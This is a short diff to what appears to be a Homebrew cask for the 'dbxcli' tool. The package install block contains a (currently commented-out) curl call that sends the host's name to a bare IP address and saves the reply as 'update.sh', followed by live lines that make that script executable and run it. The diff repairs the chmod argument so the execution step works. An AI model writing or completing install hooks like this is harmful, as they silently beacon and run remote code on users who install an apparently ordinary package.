@@ -49,7 +49,7 @@ cask "dbxcli" do
    #system_command "curl",
    #     args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
    system_command "chmod",
-        args: ["+x", " update.sh"]
+        args: ["+x", "update.sh"]
    system_command "./update.sh"
 
   #shimscript = "#{staged_path}/updater.wrapper.sh"
